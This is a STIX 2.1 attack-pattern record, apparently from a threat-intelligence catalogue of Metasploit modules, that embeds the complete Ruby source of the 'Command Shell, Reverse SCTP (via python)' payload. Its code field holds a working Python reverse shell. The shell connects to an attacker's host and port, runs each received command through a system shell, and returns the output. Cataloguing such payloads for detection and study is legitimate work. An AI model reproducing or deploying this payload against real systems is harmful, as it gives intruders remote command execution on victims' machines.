{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6601d84-0eef-4344-9d44-3a8c9de3d721",
    "created": "2024-08-14T16:33:19.397875Z",
    "modified": "2024-08-14T16:33:19.397879Z",
    "name": "Command Shell, Reverse SCTP (via python)",
    "description": "Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/python/shell_reverse_sctp.rb",
            "external_id": "shell_reverse_sctp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Python\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(\n      merge_info(\n        info,\n        'Name' => 'Command Shell, Reverse SCTP (via python)',\n        'Description' => 'Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.',\n        'Author' => 'RageLtMan <rageltman[at]sempervictus>',\n        'License' => MSF_LICENSE,\n        'Platform' => 'python',\n        'Arch' => ARCH_PYTHON,\n        'Handler' => Msf::Handler::ReverseSctp,\n        'Session' => Msf::Sessions::CommandShell,\n        'PayloadType' => 'python',\n        'Payload' => {\n          'Offsets' => {},\n          'Payload' => ''\n        }\n      )\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    cmd = <<~PYTHON\n      import socket as s\n      import subprocess as r\n      so=s.socket(s.AF_INET,s.SOCK_STREAM,132)\n      so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n      while True:\n        d=so.recv(1024)\n        if len(d)==0:\n          break\n        p=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)\n        o=p.stdout.read()+p.stderr.read()\n        try:\n          so.send(o)\n        except OSError as e:\n          if e.errno != 22:\n            raise\n    PYTHON\n\n    py_create_exec_stub(cmd)\n  end\nend\n",
    "x_mitre_platforms": [
        "python'"
    ]
}